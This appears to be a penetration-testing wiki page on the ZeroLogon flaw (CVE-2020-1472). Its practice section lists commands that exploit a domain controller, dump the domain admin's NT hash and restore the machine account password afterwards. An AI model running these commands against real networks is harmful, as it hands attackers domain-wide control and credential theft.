# 🛠️ ZeroLogon \(CVE-2020-1472\)

{% hint style="danger" %}
**This is a work-in-progress**. It's indicated with the 🛠️ emoji in the page name or in the category name
{% endhint %}

## Theory

This attack exploits an insecure customized cryptographic protocol used in the NetLogon Remote Protocol. It allows attackers to change the password of the domain controller computer account, hence giving those attackers domain admin privileges.

## Practice

This exploit changes the NT hash of the domain controller computer account in the Active Directory, but not in the local SAM database, hence creating some issues in Active Directory domains. In order to prevent denial of service, attackers can exploit the CVE, find the NT hash of the domain controller machine account before it was changed, and set it back in the AD.

```bash
# Scan for the vulnerability (https://github.com/SecuraBV/CVE-2020-1472)
zerologon-scan 'DC_name' 'DC_IP_address'

# Exploit the vulnerability: set the NT hash to \x00*8 (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py)
zerologon-exploit 'DC_name' 'DC_IP_address'

# Obtain the Domain Admin's NT hash
secretsdump -no-pass 'Domain'/'DC_computer_account$'@'Domain_controller'

# Obtain the machine account hex encoded password with the domain admin credentials
secretsdump -hashes :'NThash' 'Domain'/'Domain_admin'@'Domain_controller'

# Restore the machine account password (https://github.com/dirkjanm/CVE-2020-1472/blob/master/restorepassword.py)
# Exemple zerologon-restore breaking/dc01@dc01 -target-ip 192.168.56.101 hexpass
zerologon-restore 'Domain'/'DC_account'@'Domain_controller' -target-ip 'DC_IP_address' -hexpass 'DC_hexpass'

# (alternate option mimikatz) Change the NT hash of the domain controller machine account in the AD back to its original value
lsadump::changentlm /server:'DC.DOMAIN.LOCAL'  /user:'DC_name$' /oldntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /newntlm:'old_NThash'
```



## References

{% embed url="https://www.secura.com/blog/zero-logon" caption="" %}

{% embed url="https://github.com/dirkjanm/CVE-2020-1472" %}



